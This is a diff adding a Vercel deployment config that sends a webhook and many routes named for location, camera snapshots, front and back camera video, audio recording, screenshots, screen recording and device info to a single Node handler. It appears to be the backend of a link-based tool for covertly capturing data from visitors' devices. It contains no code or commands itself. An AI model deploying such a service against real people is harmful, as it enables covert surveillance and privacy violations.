@@ -1,0 +1,39 @@
+{
+  "version": 2,
+  "builds": [
+    {
+      "src": "api/index.js",
+      "use": "@vercel/node@2.15.10"
+    }
+  ],
+  "routes": [
+    { "src": "/webhook", "dest": "/api/index.js" },
+    { "src": "/w/(.*)", "dest": "/api/index.js" },
+    { "src": "/c/(.*)", "dest": "/api/index.js" },
+    { "src": "/location", "dest": "/api/index.js" },
+    { "src": "/camsnap", "dest": "/api/index.js" },
+    { "src": "/screenshot", "dest": "/api/index.js" },
+    { "src": "/cameravideo", "dest": "/api/index.js" },
+    { "src": "/videofrontcamera", "dest": "/api/index.js" },
+    { "src": "/videobackcamera", "dest": "/api/index.js" },
+    { "src": "/audiocapture", "dest": "/api/index.js" },
+    { "src": "/audiorecording", "dest": "/api/index.js" },
+    { "src": "/deviceinfo", "dest": "/api/index.js" },
+    { "src": "/frontcamera", "dest": "/api/index.js" },
+    { "src": "/backcamera", "dest": "/api/index.js" },
+    { "src": "/allcams", "dest": "/api/index.js" },
+    { "src": "/screenrecording", "dest": "/api/index.js" },
+    { "src": "/(.*)", "dest": "/api/index.js" }
+  ],
+  "env": {
+    "NODE_ENV": "production"
+  },
+  "functions": {
+    "api/index.js": {
+      "memory": 1024,
+      "maxDuration": 10
+    }
+  },
+  "framework": null,
+  "nodeVersion": "18.x"
+}
